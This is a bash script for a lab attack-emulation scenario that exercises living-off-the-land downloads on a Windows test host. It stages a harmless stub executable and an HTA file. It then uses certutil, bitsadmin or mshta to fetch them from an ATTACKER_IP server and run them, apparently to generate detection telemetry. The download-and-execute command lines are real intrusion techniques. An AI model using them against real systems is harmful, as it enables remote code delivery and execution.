#!/usr/bin/env bash
# S06 — Living-off-the-land download (LOLBins) on Erebor.
# Params: VARIANT (1=certutil, 2=bitsadmin, 3=mshta). Barad-dûr serves the file.
# See scenarios/S06-lolbins.md.
run_scenario() {
  local BASE="http://$ATTACKER_IP:$STAGE_HTTP_PORT"

  step "stage a benign payload + hta on Barad-dûr"
  # A tiny, harmless PE stand-in is fine for telemetry; a real exe isn't needed
  # to exercise the LOLBin download + child-process behavior in the lab.
  drop_stage_file "payload.exe" $'MZ benign-lab-stub\n'
  drop_stage_file "a.hta" $'<html><script>new ActiveXObject("WScript.Shell").Run("cmd /c echo hta-ran > C:\\\\Users\\\\Public\\\\hta.marker");</script></html>\n'
  serve_stage

  case "$VARIANT" in
    1) step "variant certutil"
       on_win "certutil" "cmd /c \"certutil -urlcache -split -f $BASE/payload.exe C:\\Users\\Public\\p.exe & C:\\Users\\Public\\p.exe\""
       note "certutil download → C:\\Users\\Public\\p.exe then executed" ;;
    2) step "variant bitsadmin"
       on_win "bitsadmin" "cmd /c \"bitsadmin /transfer job /download /priority normal $BASE/payload.exe C:\\Users\\Public\\p.exe & C:\\Users\\Public\\p.exe\""
       note "bitsadmin /transfer → C:\\Users\\Public\\p.exe then executed" ;;
    3) step "variant mshta (proxy execution)"
       on_win "mshta" "cmd /c \"mshta $BASE/a.hta\""
       note "mshta remote hta executed" ;;
  esac

  stop_stage
  noise_win
}
